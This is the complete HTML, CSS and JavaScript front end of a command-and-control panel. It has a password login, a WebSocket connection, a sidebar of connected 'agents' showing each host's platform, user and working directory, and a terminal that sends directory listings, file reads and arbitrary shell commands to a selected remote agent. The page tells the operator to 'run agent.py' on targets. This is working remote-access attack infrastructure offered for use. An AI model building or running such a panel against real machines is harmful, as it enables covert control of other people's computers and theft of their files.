<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>C2 Panel</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
/* ═══════════════════════════════════════════
   RESET & BASE
═══════════════════════════════════════════ */
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{
  --bg:       #04060d;
  --bg1:      #080c18;
  --bg2:      #0d1226;
  --bg3:      #111830;
  --glass:    rgba(13,18,38,0.6);
  --border:   rgba(0,210,255,0.08);
  --border2:  rgba(0,210,255,0.18);
  --cyan:     #00d4ff;
  --cyan2:    #00aacc;
  --cyan-glow:rgba(0,212,255,0.25);
  --green:    #00ff9d;
  --red:      #ff4d6d;
  --yellow:   #ffd060;
  --purple:   #9b6dff;
  --text:     #c8d8e8;
  --dim:      #445566;
  --dim2:     #334455;
  --mono:     'JetBrains Mono',monospace;
  --sans:     'Inter',sans-serif;
  --radius:   12px;
  --radius-sm:8px;
}

html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text)}
body{font-family:var(--sans);font-size:14px;line-height:1.5}

/* ═══════════════════════════════════════════
   SCROLLBAR
═══════════════════════════════════════════ */
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}

/* ═══════════════════════════════════════════
   BACKGROUND GRID
═══════════════════════════════════════════ */
body::before{
  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:
    linear-gradient(rgba(0,212,255,0.025) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,212,255,0.025) 1px,transparent 1px);
  background-size:40px 40px;
}

/* ═══════════════════════════════════════════
   LOGIN SCREEN
═══════════════════════════════════════════ */
#login{
  position:fixed;inset:0;z-index:100;
  display:flex;align-items:center;justify-content:center;
  background:var(--bg);
  flex-direction:column;gap:0;
}

.login-card{
  width:min(380px,90vw);
  background:var(--glass);
  backdrop-filter:blur(20px);
  border:1px solid var(--border2);
  border-radius:var(--radius);
  padding:40px 32px;
  box-shadow:0 0 60px rgba(0,212,255,0.08), 0 24px 60px rgba(0,0,0,0.6);
  position:relative;overflow:hidden;
}
.login-card::before{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,var(--cyan),transparent);
  opacity:.6;
}

.logo{
  text-align:center;margin-bottom:32px;
}
.logo-icon{
  font-family:var(--mono);font-size:11px;color:var(--dim);letter-spacing:2px;
  margin-bottom:12px;
}
.logo-title{
  font-family:var(--mono);font-size:28px;font-weight:700;
  color:var(--cyan);letter-spacing:8px;
  text-shadow:0 0 30px var(--cyan-glow),0 0 60px rgba(0,212,255,0.1);
}
.logo-sub{
  font-size:11px;color:var(--dim);letter-spacing:3px;margin-top:4px;
  font-family:var(--mono);
}

.input-group{position:relative;margin-bottom:16px;}
.input-label{font-size:11px;color:var(--dim);letter-spacing:1.5px;margin-bottom:8px;display:block;font-family:var(--mono);}
.input-wrap{position:relative;}
.login-input{
  width:100%;background:rgba(0,0,0,0.4);
  border:1px solid var(--border2);
  border-radius:var(--radius-sm);
  color:var(--text);
  padding:14px 44px 14px 16px;
  font-family:var(--mono);font-size:14px;
  outline:none;transition:border-color .2s,box-shadow .2s;
}
.login-input:focus{
  border-color:var(--cyan);
  box-shadow:0 0 0 3px rgba(0,212,255,0.08),inset 0 0 20px rgba(0,212,255,0.03);
}
.toggle-pass{
  position:absolute;right:14px;top:50%;transform:translateY(-50%);
  background:none;border:none;color:var(--dim);cursor:pointer;
  font-size:16px;padding:4px;
}
.toggle-pass:hover{color:var(--cyan);}

.login-btn{
  width:100%;padding:15px;margin-top:8px;
  background:linear-gradient(135deg,var(--cyan),var(--cyan2));
  color:#000;border:none;border-radius:var(--radius-sm);
  font-family:var(--mono);font-size:13px;font-weight:700;
  letter-spacing:3px;cursor:pointer;
  transition:all .2s;position:relative;overflow:hidden;
}
.login-btn::before{
  content:'';position:absolute;inset:0;
  background:linear-gradient(135deg,rgba(255,255,255,0.1),transparent);
}
.login-btn:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,212,255,0.4);}
.login-btn:active{transform:translateY(0);}

.login-err{
  text-align:center;color:var(--red);font-size:12px;
  font-family:var(--mono);margin-top:12px;min-height:18px;
  opacity:0;transition:opacity .2s;
}
.login-err.show{opacity:1;}

.login-corner{
  position:absolute;width:16px;height:16px;border-color:var(--cyan);border-style:solid;opacity:.4;
}
.login-corner.tl{top:12px;left:12px;border-width:2px 0 0 2px;}
.login-corner.tr{top:12px;right:12px;border-width:2px 2px 0 0;}
.login-corner.bl{bottom:12px;left:12px;border-width:0 0 2px 2px;}
.login-corner.br{bottom:12px;right:12px;border-width:0 2px 2px 0;}

/* ═══════════════════════════════════════════
   MAIN LAYOUT
═══════════════════════════════════════════ */
#main{display:none;height:100%;flex-direction:column;position:relative;z-index:1;}

/* TOP BAR */
.topbar{
  display:flex;align-items:center;justify-content:space-between;
  padding:0 16px;height:56px;flex-shrink:0;
  background:var(--glass);backdrop-filter:blur(20px);
  border-bottom:1px solid var(--border);
  position:relative;z-index:50;
}
.topbar::after{
  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,var(--border2),transparent);
}

.topbar-left{display:flex;align-items:center;gap:12px;}
.hamburger{
  display:none;background:none;border:none;cursor:pointer;
  flex-direction:column;gap:4px;padding:8px;border-radius:6px;
}
.hamburger span{
  display:block;width:18px;height:2px;background:var(--cyan);
  border-radius:2px;transition:all .25s;
}
.hamburger.open span:nth-child(1){transform:translateY(6px) rotate(45deg);}
.hamburger.open span:nth-child(2){opacity:0;}
.hamburger.open span:nth-child(3){transform:translateY(-6px) rotate(-45deg);}

.brand{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--cyan);letter-spacing:4px;}
.brand-dot{color:var(--dim);margin:0 2px;}

.topbar-right{display:flex;align-items:center;gap:16px;}

.ws-badge{
  display:flex;align-items:center;gap:6px;
  background:rgba(0,0,0,0.3);border:1px solid var(--border);
  border-radius:20px;padding:5px 12px;
  font-size:11px;font-family:var(--mono);
}
.ws-dot{width:7px;height:7px;border-radius:50%;background:var(--dim);}
.ws-dot.on{background:var(--green);box-shadow:0 0 8px var(--green);}
.ws-dot.err{background:var(--red);}
.ws-label{color:var(--dim);}
.ws-label span{color:var(--text);}

.agent-badge{
  background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);
  border-radius:20px;padding:5px 12px;
  font-size:11px;font-family:var(--mono);color:var(--cyan);
}

/* BODY */
.body-wrap{flex:1;display:flex;overflow:hidden;position:relative;}

/* SIDEBAR */
.sidebar{
  width:260px;flex-shrink:0;
  background:var(--glass);backdrop-filter:blur(20px);
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  transition:transform .3s cubic-bezier(.4,0,.2,1);
}

.sidebar-header{
  padding:16px 16px 12px;
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
}
.sidebar-title{
  font-size:10px;letter-spacing:3px;color:var(--dim);
  font-family:var(--mono);font-weight:500;
}
.agent-count-pill{
  background:rgba(0,212,255,0.12);border:1px solid rgba(0,212,255,0.2);
  border-radius:10px;padding:2px 8px;
  font-size:11px;color:var(--cyan);font-family:var(--mono);
}

.sidebar-search{
  padding:12px;border-bottom:1px solid var(--border);
}
.search-input{
  width:100%;background:rgba(0,0,0,0.3);
  border:1px solid var(--border);border-radius:var(--radius-sm);
  color:var(--text);padding:8px 12px;
  font-family:var(--mono);font-size:12px;outline:none;
  transition:border-color .2s;
}
.search-input:focus{border-color:var(--border2);}
.search-input::placeholder{color:var(--dim);}

.agent-list{flex:1;overflow-y:auto;padding:8px;}

.agent-item{
  padding:12px;margin-bottom:6px;
  border-radius:var(--radius-sm);
  border:1px solid var(--border);
  cursor:pointer;
  transition:all .2s;
  position:relative;overflow:hidden;
}
.agent-item::before{
  content:'';position:absolute;left:0;top:0;bottom:0;width:3px;
  background:var(--green);transition:opacity .2s;
}
.agent-item.dead::before{background:var(--red);}
.agent-item:hover{background:rgba(0,212,255,0.04);border-color:var(--border2);}
.agent-item.active{
  background:rgba(0,212,255,0.06);
  border-color:rgba(0,212,255,0.25);
  box-shadow:0 0 20px rgba(0,212,255,0.05);
}

.agent-row1{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;}
.agent-id{font-family:var(--mono);font-size:13px;font-weight:600;color:var(--cyan);}
.agent-alive-dot{
  width:7px;height:7px;border-radius:50%;background:var(--green);
  box-shadow:0 0 8px var(--green);
  animation:pulse-dot 2s ease-in-out infinite;
  flex-shrink:0;
}
.agent-item.dead .agent-alive-dot{background:var(--red);box-shadow:none;animation:none;}
@keyframes pulse-dot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.85)}}

.agent-platform{
  font-size:11px;color:var(--dim);
  font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
}
.agent-node{font-size:11px;color:var(--dim2);font-family:var(--mono);margin-top:1px;}

.empty-agents{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:32px 16px;text-align:center;
}
.empty-agents .ea-icon{font-size:32px;margin-bottom:12px;opacity:.3;}
.empty-agents .ea-text{font-size:12px;color:var(--dim);font-family:var(--mono);line-height:1.8;}

/* TERMINAL AREA */
.terminal{
  flex:1;display:flex;flex-direction:column;min-width:0;
  background:transparent;
}

.term-header{
  padding:12px 16px;
  background:var(--glass);backdrop-filter:blur(20px);
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:12px;flex-shrink:0;
  flex-wrap:wrap;
}
.term-agent-id{font-family:var(--mono);font-size:14px;font-weight:700;color:var(--cyan);}
.term-info-badges{display:flex;gap:8px;flex-wrap:wrap;}
.info-badge{
  font-size:10px;padding:3px 8px;border-radius:4px;
  font-family:var(--mono);
  background:rgba(0,0,0,0.3);border:1px solid var(--border);color:var(--dim);
}
.info-badge.os{border-color:rgba(155,109,255,0.3);color:var(--purple);}
.info-badge.cwd{border-color:rgba(0,255,157,0.2);color:var(--green);}

.term-output{
  flex:1;overflow-y:auto;padding:16px;
  font-family:var(--mono);font-size:13px;line-height:1.7;
}

.line{display:flex;gap:8px;margin-bottom:2px;align-items:flex-start;}
.line-ts{
  font-size:10px;color:var(--dim2);flex-shrink:0;margin-top:2px;
  letter-spacing:.5px;
}
.line-body{flex:1;min-width:0;word-break:break-all;white-space:pre-wrap;}
.line.cmd .line-body{color:var(--cyan);}
.line.res .line-body{color:var(--text);}
.line.err .line-body{color:var(--red);}
.line.sys .line-body{color:var(--yellow);font-style:italic;}

/* COMMAND INPUT */
.cmd-bar{
  padding:12px 16px;
  background:var(--glass);backdrop-filter:blur(20px);
  border-top:1px solid var(--border);
  display:flex;align-items:center;gap:10px;flex-shrink:0;
}
.cmd-prompt{
  font-family:var(--mono);font-size:13px;color:var(--cyan);
  white-space:nowrap;flex-shrink:0;
}
.cmd-input{
  flex:1;background:rgba(0,0,0,0.3);
  border:1px solid var(--border);border-radius:var(--radius-sm);
  color:var(--text);padding:11px 14px;
  font-family:var(--mono);font-size:13px;outline:none;
  transition:border-color .2s,box-shadow .2s;min-width:0;
}
.cmd-input:focus{
  border-color:var(--border2);
  box-shadow:0 0 0 2px rgba(0,212,255,0.06);
}
.cmd-input::placeholder{color:var(--dim2);}
.cmd-send{
  background:linear-gradient(135deg,var(--cyan),var(--cyan2));
  color:#000;border:none;border-radius:var(--radius-sm);
  padding:11px 20px;font-family:var(--mono);font-size:12px;
  font-weight:700;cursor:pointer;transition:all .2s;
  white-space:nowrap;flex-shrink:0;letter-spacing:1px;
}
.cmd-send:hover{box-shadow:0 4px 16px rgba(0,212,255,0.35);transform:translateY(-1px);}
.cmd-send:active{transform:translateY(0);}

/* EMPTY TERMINAL STATE */
.no-agent{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:16px;padding:32px;
}
.na-art{font-family:var(--mono);font-size:11px;color:var(--dim2);line-height:1.4;text-align:center;}
.na-title{font-size:13px;color:var(--dim);font-family:var(--mono);}

/* BACKDROP (mobile) */
.backdrop{
  display:none;position:fixed;inset:0;z-index:30;
  background:rgba(0,0,0,0.6);backdrop-filter:blur(2px);
  opacity:0;transition:opacity .3s;pointer-events:none;
}
.backdrop.show{opacity:1;pointer-events:all;}

/* ═══════════════════════════════════════════
   MOBILE
═══════════════════════════════════════════ */
@media(max-width:768px){
  .hamburger{display:flex;}

  .sidebar{
    position:fixed;left:0;top:56px;bottom:0;z-index:40;
    width:280px;
    transform:translateX(-100%);
    box-shadow:4px 0 40px rgba(0,0,0,0.5);
  }
  .sidebar.open{transform:translateX(0);}

  .backdrop{display:block;}

  .topbar{padding:0 12px;}
  .ws-badge .ws-label span{display:none;}
  .brand{font-size:13px;letter-spacing:3px;}

  .term-output{padding:12px;}
  .cmd-bar{padding:10px 12px;gap:8px;}
  .cmd-send{padding:11px 16px;font-size:11px;}
  .cmd-prompt{font-size:12px;}

  .term-header{padding:10px 12px;}
  .term-agent-id{font-size:13px;}
}

@media(max-width:420px){
  .cmd-send span{display:none;}
  .cmd-send::after{content:'▶';}
  .ws-badge{padding:5px 8px;}
  .agent-badge{padding:5px 8px;}
}

/* ═══════════════════════════════════════════
   ANIMATIONS
═══════════════════════════════════════════ */
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.line{animation:fadeIn .15s ease forwards;}

@keyframes glow-pulse{
  0%,100%{box-shadow:0 0 60px rgba(0,212,255,0.08)}
  50%{box-shadow:0 0 80px rgba(0,212,255,0.14)}
}
.login-card{animation:glow-pulse 4s ease-in-out infinite;}

/* ═══════════════════════════════════════════
   NOTIFICATIONS / TOAST
═══════════════════════════════════════════ */
#toast-container{position:fixed;bottom:24px;right:24px;z-index:200;display:flex;flex-direction:column;gap:8px;}
.toast{
  padding:12px 16px;border-radius:var(--radius-sm);
  font-family:var(--mono);font-size:12px;
  display:flex;align-items:center;gap:10px;
  backdrop-filter:blur(20px);
  animation:toast-in .3s ease,toast-out .3s ease 2.7s forwards;
  min-width:200px;max-width:300px;
}
.toast.info{background:rgba(0,212,255,0.12);border:1px solid rgba(0,212,255,0.25);color:var(--cyan);}
.toast.success{background:rgba(0,255,157,0.1);border:1px solid rgba(0,255,157,0.25);color:var(--green);}
.toast.err{background:rgba(255,77,109,0.1);border:1px solid rgba(255,77,109,0.25);color:var(--red);}
@keyframes toast-in{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
@keyframes toast-out{to{opacity:0;transform:translateY(-8px)}}
</style>
</head>
<body>

<!-- ══════════ LOGIN ══════════ -->
<div id="login">
  <div class="login-card">
    <div class="login-corner tl"></div>
    <div class="login-corner tr"></div>
    <div class="login-corner bl"></div>
    <div class="login-corner br"></div>

    <div class="logo">
      <div class="logo-icon">COMMAND &amp; CONTROL</div>
      <div class="logo-title">[ C2 ]</div>
      <div class="logo-sub">SECURE ACCESS TERMINAL</div>
    </div>

    <div class="input-group">
      <label class="input-label">ACCESS KEY</label>
      <div class="input-wrap">
        <input id="passInput" class="login-input" type="password" placeholder="enter password" autocomplete="current-password">
        <button class="toggle-pass" onclick="togglePass()" tabindex="-1">👁</button>
      </div>
    </div>

    <button class="login-btn" onclick="doLogin()">
      <span>AUTHENTICATE</span>
    </button>
    <div class="login-err" id="loginErr">invalid access key</div>
  </div>
</div>

<!-- ══════════ MAIN ══════════ -->
<div id="main">

  <!-- TOP BAR -->
  <div class="topbar">
    <div class="topbar-left">
      <button class="hamburger" id="hamburger" onclick="toggleSidebar()">
        <span></span><span></span><span></span>
      </button>
      <div class="brand">C2<span class="brand-dot">·</span>PANEL</div>
    </div>
    <div class="topbar-right">
      <div class="ws-badge">
        <div class="ws-dot" id="wsDot"></div>
        <div class="ws-label">ws: <span id="wsStatus">—</span></div>
      </div>
      <div class="agent-badge" id="agentCountBadge">0 agents</div>
    </div>
  </div>

  <!-- BODY -->
  <div class="body-wrap">

    <!-- SIDEBAR -->
    <div class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-title">ACTIVE AGENTS</div>
        <div class="agent-count-pill" id="sidebarCount">0</div>
      </div>
      <div class="sidebar-search">
        <input class="search-input" type="text" id="searchInput" placeholder="filter agents…" oninput="filterAgents()">
      </div>
      <div class="agent-list" id="agentList">
        <div class="empty-agents" id="emptyAgents">
          <div class="ea-icon">◎</div>
          <div class="ea-text">no agents connected<br>run agent.py to start</div>
        </div>
      </div>
    </div>

    <!-- BACKDROP -->
    <div class="backdrop" id="backdrop" onclick="closeSidebar()"></div>

    <!-- TERMINAL -->
    <div class="terminal" id="terminal">
      <div class="no-agent" id="noAgentState">
        <div class="na-art">
╔══════════════════════╗
║  AWAITING CONNECTION  ║
╚══════════════════════╝
        </div>
        <div class="na-title">select an agent to begin</div>
      </div>
    </div>

  </div>
</div>

<!-- TOAST CONTAINER -->
<div id="toast-container"></div>

<script>
// ════════════════════════════════════════════
//  STATE
// ════════════════════════════════════════════
let ws, currentAgent = null;
const agents  = {};
const outputs = {};
const cmdHistory = {};
const histIdx   = {};

// ════════════════════════════════════════════
//  LOGIN
// ════════════════════════════════════════════
function togglePass(){
  const i=document.getElementById('passInput');
  i.type = i.type==='password' ? 'text' : 'password';
}

document.addEventListener('keydown', e=>{
  if(e.key==='Enter' && document.getElementById('login').style.display!=='none'){
    doLogin();
  }
});

async function doLogin(){
  const pass = document.getElementById('passInput').value;
  const err  = document.getElementById('loginErr');
  if(!pass){ showErr(err,'enter a password'); return; }

  try{
    const r = await fetch('/api/login',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({password:pass})
    });
    const d = await r.json();
    if(d.ok){
      document.getElementById('login').style.display='none';
      const main=document.getElementById('main');
      main.style.display='flex';
      connectWS();
      toast('connected','success');
    } else {
      showErr(err,'invalid access key');
      document.getElementById('passInput').value='';
      document.getElementById('passInput').focus();
    }
  } catch(e){ showErr(err,'server unreachable'); }
}

function showErr(el,msg){
  el.textContent=msg;
  el.classList.add('show');
  setTimeout(()=>el.classList.remove('show'),3000);
}

// ════════════════════════════════════════════
//  WEBSOCKET
// ════════════════════════════════════════════
function connectWS(){
  const proto = location.protocol==='https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}`);

  ws.onopen = ()=>{
    setWS('online',true);
  };
  ws.onclose = ()=>{
    setWS('offline',false);
    setTimeout(connectWS,3000);
  };
  ws.onerror = ()=>{
    setWS('error',false,true);
  };
  ws.onmessage = e=>{
    const msg = JSON.parse(e.data);
    if     (msg.type==='init')         handleInit(msg);
    else if(msg.type==='connected')    handleConnected(msg);
    else if(msg.type==='disconnected') handleDisconnected(msg);
    else if(msg.type==='result')       handleResult(msg);
    else if(msg.type==='heartbeat')    handleHeartbeat(msg);
  };
}

function setWS(label, on, err){
  document.getElementById('wsStatus').textContent = label;
  const dot = document.getElementById('wsDot');
  dot.className = 'ws-dot' + (on?' on':err?' err':'');
}

// ════════════════════════════════════════════
//  AGENT EVENTS
// ════════════════════════════════════════════
function handleInit(msg){
  for(const a of msg.agents) registerAgent(a);
  renderAgentList();
  updateCountBadge();
}
function handleConnected(msg){
  registerAgent(msg.agent);
  renderAgentList();
  updateCountBadge();
  toast(`agent ${msg.agent.id} connected`,'success');
}
function handleDisconnected(msg){
  if(agents[msg.agentId]){
    agents[msg.agentId].dead=true;
    renderAgentList();
    sysLine(msg.agentId,`agent ${msg.agentId} timed out`);
    if(currentAgent===msg.agentId) refreshTermHeader();
  }
  updateCountBadge();
  toast(`agent ${msg.agentId} lost`,'err');
}
function handleResult(msg){
  const{agentId,data}=msg;
  if(!outputs[agentId]) return;
  if(data.error) appendLine(agentId,'err',data.error);
  else appendLine(agentId,'res',data.result||data.output||data.b64||JSON.stringify(data));
}
function handleHeartbeat(msg){
  if(agents[msg.agentId]) agents[msg.agentId].lastSeen=msg.ts;
}

function registerAgent(a){
  agents[a.id]=a;
  if(!outputs[a.id])    outputs[a.id]=[];
  if(!cmdHistory[a.id]) cmdHistory[a.id]=[];
  if(!histIdx[a.id])    histIdx[a.id]=-1;
}

// ════════════════════════════════════════════
//  AGENT LIST RENDER
// ════════════════════════════════════════════
let filterQ = '';
function filterAgents(){
  filterQ = document.getElementById('searchInput').value.toLowerCase();
  renderAgentList();
}

function renderAgentList(){
  const list = document.getElementById('agentList');
  const empty = document.getElementById('emptyAgents');
  const entries = Object.entries(agents).filter(([id])=>
    !filterQ || id.toLowerCase().includes(filterQ) || (agents[id].info?.platform||'').toLowerCase().includes(filterQ)
  );

  if(entries.length===0 && !filterQ){
    if(!list.contains(empty)) list.innerHTML='';
    list.appendChild(empty);
    return;
  }
  list.innerHTML='';

  for(const [id,a] of entries){
    const div = document.createElement('div');
    div.className='agent-item'+(a.dead?' dead':'')+(currentAgent===id?' active':'');
    div.dataset.id=id;
    const idle = a.lastSeen ? Math.round((Date.now()-a.lastSeen)/1000) : '?';
    div.innerHTML=`
      <div class="agent-row1">
        <span class="agent-id">${escHtml(id)}</span>
        <span class="agent-alive-dot"></span>
      </div>
      <div class="agent-platform">${escHtml(a.info?.platform||'unknown')} · ${escHtml(a.info?.node||'?')}</div>
      <div class="agent-node">${a.dead?'<span style="color:var(--red)">timed out</span>':`idle ${idle}s`}</div>
    `;
    div.onclick=()=>{ selectAgent(id); closeSidebar(); };
    list.appendChild(div);
  }
}

function updateCountBadge(){
  const alive = Object.values(agents).filter(a=>!a.dead).length;
  const total  = Object.keys(agents).length;
  document.getElementById('agentCountBadge').textContent = alive===total?`${alive} agent${alive!==1?'s':''}` : `${alive}/${total} agents`;
  document.getElementById('sidebarCount').textContent = alive;
}

// ════════════════════════════════════════════
//  TERMINAL
// ════════════════════════════════════════════
function selectAgent(id){
  currentAgent=id;
  renderAgentList();
  renderTerminal(id);
}

function renderTerminal(id){
  const a   = agents[id];
  const term= document.getElementById('terminal');

  term.innerHTML=`
    <div class="term-header" id="termHeader">
      <span class="term-agent-id">${escHtml(id)}</span>
      <div class="term-info-badges">
        ${a.info?.platform?`<span class="info-badge os">${escHtml(a.info.platform)}</span>`:''}
        ${a.info?.user?`<span class="info-badge">${escHtml(a.info.user)}</span>`:''}
        ${a.info?.cwd?`<span class="info-badge cwd">${escHtml(a.info.cwd)}</span>`:''}
        ${a.dead?`<span class="info-badge" style="color:var(--red);border-color:rgba(255,77,109,.3)">TIMED OUT</span>`:''}
      </div>
    </div>
    <div class="term-output" id="out_${id}"></div>
    <div class="cmd-bar">
      <span class="cmd-prompt">❯</span>
      <input id="cmd_${id}" class="cmd-input" type="text"
        placeholder="command… (ping, ls, cd, shell)" autocomplete="off" autocorrect="off" autocapitalize="off">
      <button class="cmd-send" onclick="sendCmd('${id}')"><span>EXEC</span></button>
    </div>
  `;

  const out = document.getElementById(`out_${id}`);
  for(const e of (outputs[id]||[])) _appendToEl(out,e.cls,e.text,e.ts);
  if(out.children.length) out.scrollTop=out.scrollHeight;

  const inp = document.getElementById(`cmd_${id}`);
  inp.addEventListener('keydown', e=>{
    if(e.key==='Enter'){ sendCmd(id); return; }
    if(e.key==='ArrowUp'){
      e.preventDefault();
      const h=cmdHistory[id]||[];
      if(!h.length) return;
      const idx = histIdx[id]<h.length-1 ? histIdx[id]+1 : h.length-1;
      histIdx[id]=idx;
      inp.value=h[h.length-1-idx];
    }
    if(e.key==='ArrowDown'){
      e.preventDefault();
      const h=cmdHistory[id]||[];
      if(histIdx[id]<=0){ histIdx[id]=-1; inp.value=''; return; }
      histIdx[id]--;
      inp.value=h[h.length-1-histIdx[id]];
    }
  });
  inp.focus();
}

function refreshTermHeader(){
  if(!currentAgent) return;
  const h = document.getElementById('termHeader');
  if(!h) return;
  const a = agents[currentAgent];
  const badges = h.querySelector('.term-info-badges');
  if(badges) badges.innerHTML += `<span class="info-badge" style="color:var(--red);border-color:rgba(255,77,109,.3)">TIMED OUT</span>`;
}

function sendCmd(id){
  const inp = document.getElementById(`cmd_${id}`);
  if(!inp) return;
  const raw = inp.value.trim();
  if(!raw) return;
  inp.value='';
  histIdx[id]=-1;

  // Store history
  if(!cmdHistory[id]) cmdHistory[id]=[];
  cmdHistory[id].push(raw);
  if(cmdHistory[id].length>50) cmdHistory[id].shift();

  appendLine(id,'cmd','❯ '+raw);

  let type,args;
  if(raw==='ping')                     { type='ping';  args={}; }
  else if(/^ls(\s|$)/.test(raw))       { type='ls';    args={path:raw.slice(3).trim()||'.'}; }
  else if(/^cd\s/.test(raw))           { type='cd';    args={path:raw.slice(3).trim()}; }
  else if(/^cat\s/.test(raw))          { type='read_file'; args={path:raw.slice(4).trim()}; }
  else                                 { type='shell'; args={cmd:raw}; }

  if(ws && ws.readyState===WebSocket.OPEN){
    ws.send(JSON.stringify({type:'exec',agentId:id,cmdType:type,args}));
  } else {
    appendLine(id,'err','ws disconnected — command not sent');
  }
}

function appendLine(agentId,cls,text,ts=null){
  const entry={cls,text,ts:ts||new Date().toLocaleTimeString('en-US',{hour12:false})};
  if(!outputs[agentId]) outputs[agentId]=[];
  outputs[agentId].push(entry);
  if(currentAgent===agentId){
    const el=document.getElementById(`out_${agentId}`);
    if(el){ _appendToEl(el,entry.cls,entry.text,entry.ts); el.scrollTop=el.scrollHeight; }
  }
}
function sysLine(agentId,text){ appendLine(agentId,'sys','⬡ '+text); }

function _appendToEl(el,cls,text,ts){
  const div=document.createElement('div');
  div.className=`line ${cls}`;
  div.innerHTML=`<span class="line-ts">${ts}</span><span class="line-body">${escHtml(text)}</span>`;
  el.appendChild(div);
}

// ════════════════════════════════════════════
//  MOBILE SIDEBAR
// ════════════════════════════════════════════
function toggleSidebar(){
  const sb   = document.getElementById('sidebar');
  const hb   = document.getElementById('hamburger');
  const bd   = document.getElementById('backdrop');
  const open = sb.classList.toggle('open');
  hb.classList.toggle('open',open);
  bd.classList.toggle('show',open);
  if(open) document.getElementById('searchInput').focus();
}
function closeSidebar(){
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('hamburger').classList.remove('open');
  document.getElementById('backdrop').classList.remove('show');
}

// ════════════════════════════════════════════
//  TOAST
// ════════════════════════════════════════════
function toast(msg,type='info'){
  const c = document.getElementById('toast-container');
  const t = document.createElement('div');
  const icons={info:'◈',success:'◆',err:'◇'};
  t.className=`toast ${type}`;
  t.innerHTML=`<span>${icons[type]||'·'}</span><span>${escHtml(msg)}</span>`;
  c.appendChild(t);
  setTimeout(()=>t.remove(),3100);
}

// ════════════════════════════════════════════
//  UTIL
// ════════════════════════════════════════════
function escHtml(s){
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// Auto-refresh agent idle times every 5s
setInterval(()=>{ if(Object.keys(agents).length) renderAgentList(); },5000);
</script>
